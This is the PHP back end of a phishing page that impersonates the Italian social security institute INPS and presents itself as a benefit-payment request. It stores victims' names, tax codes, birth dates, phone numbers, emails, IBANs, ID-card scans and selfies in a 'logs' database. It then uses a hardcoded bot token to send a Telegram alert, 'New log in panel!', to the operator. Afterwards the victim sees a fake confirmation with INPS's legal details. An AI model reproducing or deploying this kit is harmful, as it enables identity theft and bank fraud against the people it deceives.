<?php
require("database/config.php");
session_start();

$data = $_SESSION;

// Создание SQL-запроса с использованием подготовленных выражений
$sql = "INSERT INTO logs (nome, cognome, cod, tel, email, giorno, month, year, CIF, CIR, SELFIE, CIF1, CIR1, CIF2, CIR2, CIF3, CIR3, SELFIE3, iban) 
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)";

// Подготовка запроса
$stmt = $mysqli->prepare($sql);

// Передача параметров и выполнение запроса
$nome = $data['nome'];
$cognome = $data['cognome'];
$cod = $data['cod'];
$tel = $data['tel'];
$email = $data['email'];
$giorno = $data['giorno'];
$month = $data['month'];
$year = $data['year'];
$CIF = 'doc/'.$data['CIF'];
$CIR = 'doc/'.$data['CIR'];
$SELFIE = 'doc/'.$data['SELFIE'];
$CIF1 = 'doc/'.$data['CIF1'];
$CIR1 = 'doc/'.$data['CIR1'];
$CIF2 = 'doc/'.$data['CIF2'];
$CIR2 = 'doc/'.$data['CIR2'];
$CIF3 = 'doc/'.$data['CIF3'];
$CIR3 = 'doc/'.$data['CIR3'];
$SELFIE3 = 'doc/'.$data['SELFIE3'];
$iban = $data['iban'];

$stmt->bind_param('sssssssssssssssssss', 
    $nome, $cognome, $cod, $tel, $email, 
    $giorno, $month, $year, $CIF, $CIR, 
    $SELFIE, $CIF1, $CIR1, $CIF2, $CIR2, 
    $CIF3, $CIR3, $SELFIE3, $iban);

$stmt->execute();

// Закрытие подготовленного запроса и соединения
$stmt->close();
$mysqli->close();

// Сделай отправку сообщения в телеграм

$botToken = '6635934086:AAE0Oe8V2JatOU_6BsZ_Bs6GZ0tnT7Nars0';

// Замените 'your_chat_id' на реальный идентификатор вашего чата
$chatId = '612475751';

// Текст сообщения, который вы хотите отправить
$message = 'Новый лог в панели!';

// Формируем URL для отправки запроса к API Telegram
$apiUrl = "https://api.telegram.org/bot$botToken/sendMessage";

// Формируем данные для POST-запроса
$data = [
    'chat_id' => $chatId,
    'text' => $message,
];

$options = [
    'http' => [
        'header' => 'Content-type: application/x-www-form-urlencoded',
        'method' => 'POST',
        'content' => http_build_query($data),
    ],
];

// Создаем контекст потока
$context = stream_context_create($options);

// Отправляем POST-запрос и получаем ответ
$result = file_get_contents($apiUrl, false, $context);
?>
<html class="sfondo"><head><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">


<style>
.father {
 display: flex;
    justify-content: center;
    align-items: center;
}
.resto{
    display: none ;
}

.nascondi{
    display: none !important;
}

.child {

      background-image: url(logo.jpg);
    margin-top: 100%;
    position: absolute; 
}
.myButton {
    width: 100%;
    background-color:#5498d4;
    border-radius:23px;
    border:1px solid #5498d4;
    display:inline-block;
    cursor:pointer;
    color:#ffffff;
    font-family:Arial;
    font-size:17px;
    font-weight:bold;
    padding:17px 31px;
    text-decoration:none;
    text-shadow:0px 1px 0px #5498d4;
}
.myButton:hover {
    background-color:#5498d4;
}
.myButton:active {
    position:relative;
    top:1px;
}

        

label{
    margin: 15px 0px !important;
     font-size: 110%;
}
.i1{
    width:100%;
    
    
    line-height: 180%;
    font-size: 110%;
}


input{
    border-top-width: 0px !important;
    border-bottom-width: 0px !important;
    border-left-width: 0px !important;
    border-right-width: 0px !important;
}
.sfondo{
    /* FLOAT: RIGHT; */
    background-repeat: no-repeat;
    background-size: cover;
}
input{
padding: 10px;background-color: whitesmoke;
    border-radius: 0px 0px 15px 15px;
}
.input2{
padding: 10px;background-color: whitesmoke;
    border-radius: 0px;
}
form .sopra{
  font-weight: bold;font-size: 90%;
      border-radius: 15px 15px 0px 0px;
      background-color: whitesmoke;margin: 0;padding: 10px 0px 0px 10px;color: black;
}
form .sopra2{
  font-weight: normal;font-size: 90%;
      border-radius:0px 0px  15px 15px ;
      background-color: whitesmoke;margin: 0;padding: 10px 0px 10px 10px;color: #545454;
}
</style>

</head><body>
    <div class="father" style="display: none;">
    <div class="child"><img src="logo.png"></div>
</div>
<div class="resto" style="display: block;">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css">
<link rel="stylesheet" href="https://unpkg.com/purecss@2.0.5/build/pure-min.css">
<script src="jquery-latest.min.js"></script>
<div style="">
<img src="logo2.jpg" style="margin: 15px 15px 10px 15px;width: 250px;">
</div>


<div style="font-size: 140%;margin: 0px 4%;font-weight:normal">    

        

    <p>INPS EROGAZIONI - 2 di 2</p>
<div class="progress">
  <div class="progress-bar" role="progressbar" style="width: 100%;background-color: green;" aria-valuenow="40" aria-valuemin="0" aria-valuemax="100"></div>
</div>



<form method="POST" autocomplete="off" enctype="multipart/form-data">

        

<h3 style="font-size: 96%;margin-top: 39px;border: 1px solid darkgreen;font-size: 114%;padding: 30px;background-color: #ecffe1;">Grazie, se ha caricato correttamente i dati richiesti la sua richiesta verrà processata a breve. Sarà contattato se avremmo bisogno di documentazione aggiuntiva. </h3>
        <br>
        
   
        
        
        
         
          
        
        <br><br>
</form>
</div><div style="background-color: #5a6772;"><img src="logo2.png" style="margin: 15px 15px 10px 15px;"><p style="color: white;padding: 18px;">Istituto Nazionale Previdenza Sociale<br>
P.IVA 02121151001<br>
Sede Legale:<br>
Via Ciro il Grande, 21<br>
00144 Roma</p>
</div>


</div>
</body></html>